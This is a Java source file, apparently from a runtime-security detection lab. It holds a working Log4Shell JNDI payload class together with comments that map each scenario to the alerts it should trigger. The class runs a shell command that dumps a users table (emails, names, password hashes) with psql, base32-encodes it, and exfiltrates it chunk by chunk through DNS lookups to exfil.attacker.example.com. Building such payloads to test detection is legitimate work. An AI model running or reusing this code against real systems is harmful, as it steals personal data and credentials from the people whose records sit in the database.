// Loaded by chain-backend's JNDI-vulnerable log4j call.
//
// log4j 2.14.1's JndiManager.lookup() casts the loaded class to
// javax.naming.spi.ObjectFactory. A plain class with only a static
// initializer doesn't pass this cast — JNDI loads the bytecode but never
// initializes the class (lazy init), so the static block never fires.
// Implementing ObjectFactory + putting the work in getObjectInstance is
// what the original 2021 demonstrators did.
//
// Scenario A: Runtime.exec("/bin/sh", ...) succeeds. The shell really connects
//             to the postgres DB (appdb), SELECTs the seeded users PII, base32-
//             encodes it, and exfiltrates it CHUNKED over DNS via getent — each
//             chunk a label under *.exfil.attacker.example.com. node-agent sees
//             the unexpected processes (R0001), the egress (R0011) and the DNS
//             exfil queries (R0005). The encoded labels carry the real stolen
//             rows, so the DNS-anomaly alerts literally capture the data in
//             flight (base32-decode an alert label to recover the PII).
// Scenario B: identical bytecode runs in JVM. Runtime.exec("/bin/sh") throws
//             IOException — distroless has no /bin/sh. R1100 (failed execve
//             ENOENT) fires on the syscall side.
// Scenario C: never loaded — log4j 2.17.1 does not perform JNDI substitution.

import java.io.IOException;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class Payload implements ObjectFactory {
    @Override
    public Object getObjectInstance(Object obj, Name name, Context ctx, Hashtable<?, ?> env) {
        System.err.println("Payload.getObjectInstance ENTERED");
        // Single-line shell for clean escaping. The real post-exploitation chain:
        //   1. psql connects to appdb (the app's own DB) as postgres and reads
        //      the WHOLE users table — email:full_name:password_hash per row.
        //   2. base32-encode + strip padding/newlines, then chunk into 50-char
        //      DNS-label-safe pieces.
        //   3. one getent (DNS) query per chunk → the data leaves the container
        //      as DNS labels (the classic JNDI/log4shell DNS-exfil pattern).
        // POSTGRES_HOST/DB are read from the backend's own env (the app already
        // talks to this DB), so the attacker rides existing config.
        String cmd =
              "set +e; "
            + "DB=${POSTGRES_DB:-appdb}; PGHOST=${POSTGRES_HOST:-chain-postgres}; "
            + "DATA=$(psql -h \"$PGHOST\" -U postgres -d \"$DB\" -At "
            + "-c \"SELECT string_agg(email || ':' || full_name || ':' || "
            + "coalesce(password_hash,''), ',') FROM users\" 2>/dev/null); "
            + "[ -z \"$DATA\" ] && DATA=NODATA; "
            + "ENC=$(printf '%s' \"$DATA\" | base32 | tr -d '=' | tr -d '\\n'); "
            + "i=0; "
            + "printf '%s' \"$ENC\" | fold -w 50 | while IFS= read -r CH; do "
            + "getent hosts \"${CH}.c${i}.exfil.attacker.example.com\" >/dev/null 2>&1; "
            + "i=$((i+1)); done; "
            + "getent hosts \"end.exfil.attacker.example.com\" >/dev/null 2>&1; "
            + "echo exfil_done";

        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            p.waitFor();
        } catch (IOException e) {
            // Distroless backend lands here: /bin/sh missing → ENOENT.
            // Kubescape's R1100 (failed execve ENOENT) fires on the syscall side.
            System.err.println("exec_failed: " + e.getMessage());
        } catch (InterruptedException ie) {
            Thread.currentThread().interrupt();
        }
        return null;
    }
}
